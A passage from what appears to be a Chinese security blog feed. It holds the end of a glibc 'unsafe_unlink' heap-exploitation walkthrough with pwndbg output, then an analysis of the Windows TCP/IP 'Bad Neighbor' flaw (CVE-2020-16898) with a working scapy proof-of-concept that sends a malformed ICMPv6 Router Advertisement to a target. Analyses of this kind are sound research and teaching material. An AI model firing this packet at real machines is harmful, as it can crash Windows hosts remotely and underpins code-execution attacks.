class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p target</span><br><span class="line">$<span class="number">15</span> = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) <span class="number">0x7fffea4571d0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h3 id="11-unsafe-unlink"><a href="#11-unsafe-unlink" class="headerlink" title="11. unsafe_unlink"></a>11. unsafe_unlink</h3><p>分配两个足够大的 chunk ，free 后不会被放入 fastbin 和tcache （0x420)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">15</span> <span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">16</span></span><br><span class="line">  <span class="number">17</span> <span class="keyword">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line">  <span class="number">18</span> <span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">► <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">21</span></span><br><span class="line">  <span class="number">22</span> chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">  <span class="number">23</span> <span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br></pre></td></tr></table></figure><p>然后我们需要在堆上伪造一个 chunk （ 我们设置我们的假块大小，这样就可以绕过<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f%E4%B8%AD%E4%BB%8B%E7%BB%8D%E7%9A%84%E6%A3%80%E6%9F%A5%E3%80%82">https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f中介绍的检查。</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">29</span> chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line">  <span class="number">30</span> <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">► <span class="number">31</span> chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">  <span class="number">32</span> <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">  <span class="number">33</span> <span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">  <span class="number">34</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>我们设置好 size ， fd ，bk 以</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0x56540553d2a0</span><span class="number">-0x20</span></span><br><span class="line"><span class="number">0x56540553d280</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x56540553d290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span>         -&gt; chunk0_ptr</span><br><span class="line"><span class="number">0x56540553d2a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span>         -&gt; fake chunk</span><br><span class="line"><span class="number">0x56540553d2b0</span>:<span class="number">0x0000565403b5b008</span><span class="number">0x0000565403b5b010</span></span><br><span class="line"><span class="number">0x56540553d2c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x56540553d2d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>我们假设我们在chunk0中有一个溢出，这样我们就可以自由地改变chunk1的数据</p><p>例如改 chunk1 的preve size  和 size</p><p>bypass check</p><p><code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P)== False</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/unsafe_unlink.c</span><br><span class="line">   <span class="number">42</span> chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">   <span class="number">43</span> <span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">44</span> <span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">   <span class="number">45</span> chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line">   <span class="number">46</span></span><br><span class="line"> ► <span class="number">47</span> <span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">$<span class="number">13</span> = <span class="number">0x430</span></span><br><span class="line">pwndbg&gt; chunkinfo <span class="number">0x56540553d6c0</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : <span class="number">0x420</span></span><br><span class="line">size : <span class="number">0x430</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">fd_nextsize : <span class="number">0x0</span></span><br><span class="line">bk_nextsize : <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>此时就会判断 chunk0 为 free 状态，然后我们free chunk1_ptr 就会发生 unlink, unlink fake chunk的链接，覆盖chunk0_ptr</p><p>最后 我们可以使用chunk0_ptr覆盖自身，另其指向一个任意位置,达到一个任意地址写的目的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">54</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr</span><br><span class="line">$<span class="number">22</span> = <span class="number">0x565403b5b008</span></span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[<span class="number">3</span>]</span><br><span class="line">$<span class="number">23</span> = <span class="number">0x565403b5b008</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x565403b5b008</span></span><br><span class="line"><span class="number">0x565403b5b008</span>:<span class="number">0x0000565403b5b008</span><span class="number">0x00007f8ca43e66a0</span></span><br><span class="line"><span class="number">0x565403b5b018</span> &lt;completed&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000565403b5b008</span></span><br><span class="line"><span class="number">0x565403b5b028</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">   <span class="number">54</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">   <span class="number">55</span></span><br><span class="line"> ► <span class="number">56</span> <span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; p/x chunk0_ptr</span><br><span class="line">$<span class="number">24</span> = <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[<span class="number">3</span>]</span><br><span class="line">$<span class="number">25</span> = <span class="number">0x7f8ca42210b3</span></span><br><span class="line">pwndbg&gt; x/s <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line"><span class="number">0x7ffe4dfce4d0</span>:<span class="string">&quot;Hello!~&quot;</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">58</span> chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"> ► <span class="number">59</span> <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/s <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line"><span class="number">0x7ffe4dfce4d0</span>:<span class="string">&quot;BBBBAAAA&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Summary" scheme="https://bestwing.me/categories/Summary/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="Heap" scheme="https://bestwing.me/tags/Heap/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-16898 &quot;Bad Neighbor&quot; 分析</title>
    <link href="https://bestwing.me/CVE-2020-15898-analysis.html"/>
    <id>https://bestwing.me/CVE-2020-15898-analysis.html</id>
    <published>2020-10-19T16:00:00.000Z</published>
    <updated>2020-10-21T02:23:11.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2020年10月14日，微软修复了一个紧急漏洞：Windows TCP/IP 远程代码执行漏洞，漏洞编号为 CVE-2020-16898。</p><p>从14 号公开的信息可以得知，这是一个与 ipv6 协议有关，漏洞类型为栈溢出的漏洞。</p><h2 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h2><p>通过公开信息</p><blockquote><p>A remote code execution vulnerability exists when the Windows TCP/IP stack improperly handles ICMPv6 Router Advertisement packets that use Option Type 25 (Recursive DNS Server Option) and a length field value that is even. In this Option, the length is counted in increments of 8 bytes, so an RDNSS option with a length of 3 should have a total length of 24 bytes. The option itself consists of five fields: Type, Length, Reserved, Lifetime, and Addresses of IPv6 Recursive DNS Servers. The first four fields always total 8 bytes, but the last field can contain a variable number of IPv6 addresses, which are 16 bytes each. As a result, the length field should always be an odd value of at least 3, per <a href="https://tools.ietf.org/html/rfc8106#section-5.3.1">RFC 8106</a>:</p></blockquote><p>以及补丁的 diff 我们大致定位了漏洞的位置</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020023239.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020023239.png"></a></p><p>漏洞发生的原因应该在 <code>Ipv6pUpdateRDNSS</code> 函数中</p><h2 id="Router-Advertisement-RA-for-short-协议"><a href="#Router-Advertisement-RA-for-short-协议" class="headerlink" title="Router Advertisement (RA for short) 协议"></a><code>Router Advertisement</code> (RA for short) 协议</h2><p>通过 <a href="https://tools.ietf.org/html/rfc8106#section-5.3.1">rfc8106</a> 我们可以知道协议报文如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0                   1                   2                   3</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|     Type      |     Length    |           Reserved            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                           Lifetime                            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                                                               |</span><br><span class="line">:            Addresses of IPv6 Recursive DNS Servers            :</span><br><span class="line">|                                                               |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>我们着重知道以下几个</p><ul><li><strong>Type（1个字节）</strong>：RDNSS选项类型的类型为 25（0x19）</li><li><strong>Length（1个字节）</strong>：如果该选项中包含一个 IPv6 地址，则长度取最小值3 。每增加一个 RDNSS 地址，长度就会增加2。接收器使用“长度”字段来确定选项中IPv6地址的数量</li><li><strong>Addresses of IPv6 Recursive DNS Servers（可变长度，由“Length”字段确定）</strong>：一个或多个递归DNS服务器的 128 位 IPv6 地址 。地址个数为（Length - 1）/ 2</li></ul><p>协议中规定：</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">o  The validity of DNS options is checked with the Length field;</span><br><span class="line">   that is, the value of the Length field in the RDNSS option is</span><br><span class="line">   greater than or equal to the minimum value (3) and satisfies the</span><br><span class="line">   requirement that (Length - 1) % 2 &#x3D;&#x3D; 0.  The value of the Length</span><br><span class="line">   field in the DNSSL option is greater than or equal to the minimum</span><br><span class="line">   value (2).  Also, the validity of the RDNSS option is checked with</span><br><span class="line">   the &quot;Addresses of IPv6 Recursive DNS Servers&quot; field; that is, the</span><br><span class="line">   addresses should be unicast addresses.</span><br></pre></td></tr></table></figure></blockquote><p>即 Length 长度字段要满足 <code>(Length - 1) % 2 == 0</code> 则 length 字段必为奇数，且是大于等于3 的奇数</p><p>假设此时 length 长度为 3， 则地址个数为 （3 - 1) / 2  == 1 ，我们知道一个地址长度为 16 字节。IPv6 Recursive DNS Servers 地址前的字段占 8 字节，每个 IPv6 Recursive DNS Servers 地址长度为 16 个字节，所以正常的 RDNSS 选项总长度应满足 16x+8（x&gt;=1），将其除以 8 就是 2x+1（x&gt;=1） ，也就是 Length 字段应该满足的条件。由于 IPv6 RDNSS 地址为 16 个字节，所以 RDNSS 选项总长度会以 16 字节递增，一个最小的长度为 24（8+16）</p><h2 id="如果-Length-是偶数"><a href="#如果-Length-是偶数" class="headerlink" title="如果 Length 是偶数"></a>如果 Length 是偶数</h2><p>通过学习协议，我们知道通常下， length 的值应为大于等 3 的奇数，但是如果当传入的 length 为偶数 2 ，那么会发生什么事情？</p><p>按照协议理解，此时 （2-1）/2 == 0 ，则会判断此 packet 没有地址，则理应会把 RDNSS 选项的最后 8 个字节错误的认为第下一个个选项的前8个字节。</p><p>例如假设我们设置 length 长度为 4 -&gt; rdnss.len = len(rdnss.dns) * 2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc_last_8_bytes</span>(<span class="params">target_addr</span>):</span></span><br><span class="line">    ip = IPv6(dst = target_addr, src = <span class="string">&quot;fe80::250:56ff:fec0:2222&quot;</span>)</span><br><span class="line">    ra = ICMPv6ND_RA()</span><br><span class="line"></span><br><span class="line">    rdnss = ICMPv6NDOptRDNSS(lifetime=<span class="number">900</span>, dns=[<span class="string">&quot;4141:4141:4141:4141:4141:4141:4141:4141&quot;</span>,</span><br><span class="line">            <span class="string">&quot;4242:4242:4242:4242:4242:4242:4242:4242&quot;</span>])</span><br><span class="line">    <span class="comment"># We put an even value for the option length (correct length should be 5)</span></span><br><span class="line">    rdnss.len = len(rdnss.dns) * <span class="number">2</span></span><br><span class="line">    <span class="comment"># We adjust the actual option size (when &#x27;confused&#x27; is appended to it,</span></span><br><span class="line">    <span class="comment"># it must be rdnss.len * 8 bytes == 0x20 bytes long)</span></span><br><span class="line">    truncated = bytes(rdnss)[: (rdnss.len<span class="number">-1</span>) * <span class="number">8</span>]</span><br><span class="line">    <span class="comment"># The last 8 bytes of the crafted RDNSS option are interpreted as</span></span><br><span class="line">    <span class="comment"># the start of a second option</span></span><br><span class="line">    confused = <span class="string">&#x27;XXXXYYYY&#x27;</span></span><br><span class="line">    crafted = truncated + confused</span><br><span class="line"></span><br><span class="line">    send(ip/ra/crafted)</span><br><span class="line"></span><br><span class="line">poc_last_8_bytes(<span class="string">&#x27;fd15:4ba5:5a2b:1008:79f7:979d:4e:97eb&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020031914.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020031914.png"></a></p><p>我们选取上面的一段汇编做一个简单的注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fffff801&#96;26bca5c8 e8a39de5ff     call    tcpip!NetioAdvanceNetBuffer (fffff801&#96;26a24370)</span><br><span class="line">fffff801&#96;26bca5cd 0fb64301       movzx   eax, byte ptr [rbx+1] ; eax &#x3D; option.length</span><br><span class="line">fffff801&#96;26bca5d1 8d4e01         lea     ecx, [rsi+1]</span><br><span class="line">fffff801&#96;26bca5d4 2bc6           sub     eax, esi              ; eax &#x3D; option.length - 1</span><br><span class="line">fffff801&#96;26bca5d6 4183cfff       or      r15d, 0FFFFFFFFh</span><br><span class="line">fffff801&#96;26bca5da 99             cdq     </span><br><span class="line">fffff801&#96;26bca5db f7f9           idiv    eax, ecx              ; eax &#x3D; (option.length - 1) &#x2F; 2</span><br><span class="line">fffff801&#96;26bca5dd 8b5304         mov     edx, dword ptr [rbx+4]</span><br><span class="line">fffff801&#96;26bca5e0 8945b7         mov     dword ptr [rbp-49h], eax</span><br><span class="line">fffff801&#96;26bca5e3 8bf0           mov     esi, eax</span><br><span class="line">fffff801&#96;26bca5e5 413bd7         cmp     edx, r15d</span><br></pre></td></tr></table></figure><p>即这断代码在做计算 地址数 <code>(4 - 1) / 2 == 1</code>. 因而会将 NET_BUFFER 前进 24 个字节（3*8）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; u rip</span><br><span class="line">tcpip!Ipv6pUpdateRDNSS+0xa9:</span><br><span class="line">fffff801&#96;26bca5dd 8b5304          mov     edx,dword ptr [rbx+4]</span><br><span class="line">fffff801&#96;26bca5e0 8945b7          mov     dword ptr [rbp-49h],eax</span><br><span class="line">fffff801&#96;26bca5e3 8bf0            mov     esi,eax</span><br><span class="line">fffff801&#96;26bca5e5 413bd7          cmp     edx,r15d</span><br><span class="line">fffff801&#96;26bca5e8 7412            je      tcpip!Ipv6pUpdateRDNSS+0xc8 (fffff801&#96;26bca5fc)</span><br><span class="line">fffff801&#96;26bca5ea 0fca            bswap   edx</span><br><span class="line">fffff801&#96;26bca5ec 8d0c12          lea     ecx,[rdx+rdx]</span><br><span class="line">fffff801&#96;26bca5ef 8bc1            mov     eax,ecx</span><br><span class="line">0: kd&gt; rax</span><br><span class="line">ax&#x3D;1</span><br></pre></td></tr></table></figure><p>当我们让程序走到下一个取下一个选项的时候，发现，此时的选项的前8个字节可被伪造</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020033744.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020033744.png"></a></p><h2 id="如何造成栈溢出的？"><a href="#如何造成栈溢出的？" class="headerlink" title="如何造成栈溢出的？"></a>如何造成栈溢出的？</h2><p>我们知道此时可以伪造前 8个字节，那么根据 type 可以走不同的程序流</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020034837.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020034837.png"></a></p><p>根据交叉引用，以及文档此时的函数有 三种 type，分别为</p><p>3： break ，似乎是正常消息</p><p>24：Route Information Option</p><p>25：RDNSS Option （<a href="https://tools.ietf.org/html/rfc4191#section-2.3%EF%BC%89">https://tools.ietf.org/html/rfc4191#section-2.3）</a></p><p>其中 25 是我们触发漏洞的地方， 那么可利用的似乎只有 24 了</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" title="image-20201021004540686" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" alt="image-20201021004540686"></a></p><p>当 type 为 24 的时候，会调用 <code>NdisGetDataBuffer</code> 该函数，我们发现此函数的 v221 值在栈上， Elen为可控的长度 * 8</p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisgetdatabuffer">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisgetdatabuffer</a></p><p>搜索微软文档我们发现该函数原型如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PVOID NdisGetDataBuffer(</span><br><span class="line">  PNET_BUFFER NetBuffer,</span><br><span class="line">  ULONG       BytesNeeded,</span><br><span class="line">  PVOID       Storage,</span><br><span class="line">  UINT        AlignMultiple,</span><br><span class="line">  UINT        AlignOffset</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>其第一个参数 NetBuffer 为一个指向 NET_BUFFER 结构的指针；第二个参数 BytesNeeded 为请求数据的长度；第三个参数 Storage 为指向缓冲区的指针，如果调用者不提供缓冲区，则为 NULL。如果此值非 NULL 且请求的数据不连续，则 NDIS 会将请求的数据复制到 Storage 指向的缓冲区。</p><p>NdisGetDataBuffer 函数返回指向连续数据的指针，或者NULL。如果缓冲区中请求的数据是连续的，则返回值是指向 NDIS 提供的位置的指针。如果数据不连续，则根据 Storage参数来判断：</p><ul><li>如果 Storage 参数为非 NULL，即指定缓冲区指针，则 NDIS 将数据复制到Storage 指向的缓冲区中，返回值为 Storage参数指针 。</li><li>如果 Storage 参数为 NULL，则返回值为 NULL。</li></ul><p>所以我们要通过此函数触发缓冲区溢出，则需要构造一个非连续的的数据包，这个问题的解决方案是构造一个 “碎片化” 的数据。对 IPv6 数据进行分段则可以。</p><p>如果我们发送带有畸形的RDNSS选项的Router Advertisement数据包时，将其分割成若干个IPv6碎片，那么重新组合的数据包数据就会以非连续的方式存储在NET_BUFFER中。这样一来，对NdisGetDataBuffer的调用就会从我们的数据包中复制任意数量的字节到堆栈中的固定大小的缓冲区中，导致基于堆栈的缓冲区溢出，使得我们可以用任意的值覆盖tcpip！Ipv6pHandleRouterAdvertisement的返回地址。</p><p>另外这里要有程序有一个检查，它允许路由信息选项的最大实际大小（option.Length * 3）为0x18。</p><p>即在一个循环遍历所有headers，做一些基本的验证</p><p>如图，Ipv6pHandleRouterAdvertisement 函数中会检查 Route Information 选项中的 Length 是否大于 3 ，如果大于 3 就会进入错误流程，然后忽略这个包的。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021003351.png" title="image-20201021003350639" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021003351.png" alt="image-20201021003350639"></a></p><p>在攻击的过程中</p><p>Route Information 选项的前 8 个字节被嵌到了第一个 Recursive DNS Server 选项的末尾。由于在 Case 0x19 的检查流程中，只判断了 Length 是否小于 3 ，而没有判断该字段是否是偶数值，可导致在对数据包选项进行检查的时候将第一个 Recursive DNS Server 选项长度误当成 0x20，因此检查是通过的。而在真正处理的过程中，又将其长度解析为 0x18</p><p>对于type为0x18会进入下面的流程处理，调用NdisGetDataBuffer函数，其中第二个参数为长度的实际字节大小，等于length<em>8，所以此时传入的actual_length_bytes = 0x22</em> 8 = 0x110：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" title="image-20201021004540686" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" alt="image-20201021004540686"></a></p><p>而Storage_1 为栈上的数组变量，将0x110个字节赋值过去，就会造成栈上的溢出，实际的崩溃是溢出覆盖了stack cookie，触发tcpip!_security_check_cookie，造成蓝屏（BSOD）：</p><p>最后贴一个蓝屏：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020040544.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020040544.png"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html">https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html</a></p><p><a href="http://site.pi3.com.pl/exp/p_CVE-2020-16898.py">http://site.pi3.com.pl/exp/p_CVE-2020-16898.py</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
